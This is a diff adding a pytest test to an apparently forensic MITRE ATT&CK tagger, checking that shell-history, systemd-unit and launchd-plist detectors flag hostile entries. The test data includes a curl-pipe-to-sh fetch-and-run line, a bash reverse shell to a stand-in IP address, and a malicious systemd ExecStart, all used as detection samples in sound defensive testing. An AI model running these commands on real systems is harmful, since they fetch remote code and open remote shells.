@@ -73,3 +73,24 @@ def test_a_log_existing_is_not_log_clearing(tmp_path) -> None:
     assert not (tmp_path / "mitre_techniques.txt").exists()
     assert tag_mitre_technique(str(tmp_path), "HOST", "bash_history")
     assert (tmp_path / "mitre_techniques.txt").read_text().split() == ["T1059.004"]  # not T1070.003
+
+
+def test_linux_and_macos_tag_what_isnt_the_os_own() -> None:
+    from rowanholt.process.extractions.mitre_tagger import launchd_technique, suspicious_shell, unusual_unit
+    assert not suspicious_shell(["ls -la", "sudo apt update", "git pull", "curl --version"])
+    assert suspicious_shell(["cd /tmp", "curl http://198.51.100.23/b | sh"])
+    assert suspicious_shell(["echo aGk= | base64 -d", "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"])
+    systemd_own = json.dumps([{"Process": "User Runtime Directory /run/user/%i",
+                               "Command": "/usr/lib/systemd/systemd-user-runtime-dir start %i"}])
+    assert not unusual_unit(systemd_own)
+    assert unusual_unit(json.dumps([{"Process": "Lab sync", "Command": "/tmp/.x/update.sh"}]))
+    assert unusual_unit("[Service]\nExecStart=/bin/sh -c 'curl http://x/a | sh'\n")
+    apple = {"Label": "com.apple.mdworker.shared", "ProgramArguments": ["/System/Library/x/mdworker_shared"]}
+    assert launchd_technique("Library+LaunchAgents+com.apple.mdworker.shared.plist", apple) is None
+    assert launchd_technique("Library+LaunchDaemons+com.apple.x.plist", {"Label": "com.apple.x"}) is None
+    lab = {"Label": "com.rivendell-lab.update", "ProgramArguments": ["/Users/Shared/.x/update.sh"]}
+    assert launchd_technique("Library+LaunchAgents+com.rivendell-lab.update.plist", lab) == "T1543.001"
+    # Named like Apple's but running from elsewhere: not Apple's
+    fake = {"Label": "com.apple.updater", "ProgramArguments": ["/Users/Shared/.u/updater"]}
+    assert launchd_technique("Library+LaunchDaemons+com.apple.updater.plist", fake) == "T1543.004"
+    assert launchd_technique("Library+Preferences+com.example.app.plist", lab) is None
